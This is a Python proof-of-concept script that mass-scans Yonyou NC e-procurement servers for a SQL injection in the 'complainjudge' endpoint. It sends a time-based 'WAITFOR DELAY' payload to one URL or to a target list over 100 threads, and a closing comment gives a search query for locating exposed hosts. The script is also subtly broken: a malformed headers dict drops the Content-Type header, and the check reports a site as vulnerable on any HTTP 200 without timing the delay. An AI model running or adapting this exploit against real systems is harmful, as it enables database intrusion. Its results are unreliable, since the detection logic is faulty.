import argparse, requests, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """用友NC系统电采complainjudge接口的sql注入漏洞"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='用友NC系统电采complainjudge接口的sql注入漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help="input your link")
    parser.add_argument('-f', '--file', dest='file', type=str, help="input your file path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/ebvp/advorappcoll/complainjudge"
    headers = {
        "User-Agent":"Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)",
        "AppleWebKit/537.36(KHTML,likeGecko)Chrome/120.0.0.0Safari/537.36"
        "Content-Type":"application/x-www-form-urlencoded"
    }
    data = "pageId=login&pk_complaint=11%27;WAITFOR%20DELAY%20%270:0:5%27--"
    try:
        response = requests.post(url=target + payload, headers=headers, data=data, verify=False, timeout=10)
        if response.status_code == 200:
            print(f"[+]{target} 存在sql注入漏洞")
            with open('用友nc电采_result.txt', 'a') as f:
                f.write(f"{target}存在sql注入漏洞\n")
        else:
            print(f"[-]{target} 不存在sql注入漏洞")
    except:
        print(f"{target}可能存在sql注入漏洞请手工测试")
if __name__ == '__main__':
    main()

# app="用友-UFIDA-NC